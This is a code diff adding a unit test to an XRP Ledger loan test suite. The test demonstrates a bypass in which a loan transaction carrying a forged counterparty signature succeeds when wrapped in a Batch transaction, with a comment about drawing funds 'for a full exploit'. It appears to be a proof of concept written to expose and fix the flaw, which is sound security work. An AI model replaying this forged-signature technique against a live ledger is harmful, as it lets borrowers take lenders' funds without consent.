@@ -1889,6 +1889,100 @@ class Loan_test : public beast::unit_test::suite
         }
     }
 
+    void
+    testBatchBypassCounterparty()
+    {
+        testcase << "Batch Bypass Counterparty";
+
+        using namespace jtx;
+        using namespace std::chrono_literals;
+        Env env(*this, all);
+
+        Account const lender{"lender"};
+        Account const borrower{"borrower"};
+
+        env.fund(XRP(1'000'000), lender, borrower);
+        env.close();
+
+        PrettyAsset const xrpAsset{xrpIssue(), 1'000'000};
+
+        BrokerInfo broker{createVaultAndBroker(env, xrpAsset, lender)};
+
+        using namespace loan;
+
+        auto const loanSetFee = fee(env.current()->fees().base * 2);
+        Number const principalRequest{1, 3};
+        auto const startDate = env.now() + 60s;
+
+        auto forgedLoanSet =
+            set(borrower, broker.brokerID, principalRequest, startDate, 0);
+
+        Json::Value randomData{Json::objectValue};
+        randomData[jss::SigningPubKey] = Json::StaticString{"2600"};
+        Json::Value sigObject{Json::objectValue};
+        sigObject[jss::SigningPubKey] = strHex(lender.pk().slice());
+        Serializer ss;
+        ss.add32(HashPrefix::txSign);
+        parse(randomData).addWithoutSigningFields(ss);
+        auto const sig = ripple::sign(borrower.pk(), borrower.sk(), ss.slice());
+        sigObject[jss::TxnSignature] = strHex(Slice{sig.data(), sig.size()});
+
+        forgedLoanSet[Json::StaticString{"CounterpartySignature"}] = sigObject;
+
+        // ? Fails because the lender hasn't signed the tx
+        env(env.json(forgedLoanSet, fee(loanSetFee)), ter(telENV_RPC_FAILED));
+
+        auto const seq = env.seq(borrower);
+        auto const batchFee = batch::calcBatchFee(env, 1, 2);
+        // ! Should fail because the lender hasn't signed the tx
+        env(batch::outer(borrower, seq, batchFee, tfAllOrNothing),
+            batch::inner(forgedLoanSet, seq + 1),
+            batch::inner(pay(borrower, lender, XRP(1)), seq + 2),
+            ter(tesSUCCESS));
+        env.close();
+
+        // ? Check that the loan was created
+        {
+            Json::Value params(Json::objectValue);
+            params[jss::account] = borrower.human();
+            params[jss::type] = "Loan";
+            auto const res =
+                env.rpc("json", "account_objects", to_string(params));
+            auto const objects = res[jss::result][jss::account_objects];
+            BEAST_EXPECT(objects.size() == 1);
+
+            auto const loan = objects[0u];
+            BEAST_EXPECT(loan[sfAssetsAvailable] == "1000");
+            BEAST_EXPECT(loan[sfBorrower] == borrower.human());
+            BEAST_EXPECT(loan[sfCloseInterestRate] == 0);
+            BEAST_EXPECT(loan[sfClosePaymentFee] == "0");
+            BEAST_EXPECT(loan[sfFlags] == 0);
+            BEAST_EXPECT(loan[sfGracePeriod] == 60);
+            BEAST_EXPECT(loan[sfInterestRate] == 0);
+            BEAST_EXPECT(loan[sfLateInterestRate] == 0);
+            BEAST_EXPECT(loan[sfLatePaymentFee] == "0");
+            BEAST_EXPECT(loan[sfLoanBrokerID] == to_string(broker.brokerID));
+            BEAST_EXPECT(loan[sfLoanOriginationFee] == "0");
+            BEAST_EXPECT(loan[sfLoanSequence] == 1);
+            BEAST_EXPECT(loan[sfLoanServiceFee] == "0");
+            BEAST_EXPECT(
+                loan[sfNextPaymentDueDate] == loan[sfStartDate].asUInt() + 60);
+            BEAST_EXPECT(loan[sfOverpaymentFee] == 0);
+            BEAST_EXPECT(loan[sfOverpaymentInterestRate] == 0);
+            BEAST_EXPECT(loan[sfPaymentInterval] == 60);
+            BEAST_EXPECT(loan[sfPaymentRemaining] == 1);
+            BEAST_EXPECT(loan[sfPreviousPaymentDate] == 0);
+            BEAST_EXPECT(loan[sfPrincipalOutstanding] == "1000");
+            BEAST_EXPECT(loan[sfPrincipalRequested] == "1000");
+            BEAST_EXPECT(
+                loan[sfStartDate].asUInt() ==
+                startDate.time_since_epoch().count());
+
+            // TODO: Draw the funds for a full exploit
+            // env(draw(borrower, loanKeylet.key, XRP(500)));
+        }
+    }
+
 public:
     void
     run() override
@@ -1896,6 +1990,7 @@ public:
         testDisabled();
         testSelfLoan();
         testLifecycle();
+        testBatchBypassCounterparty();
     }
 };
 
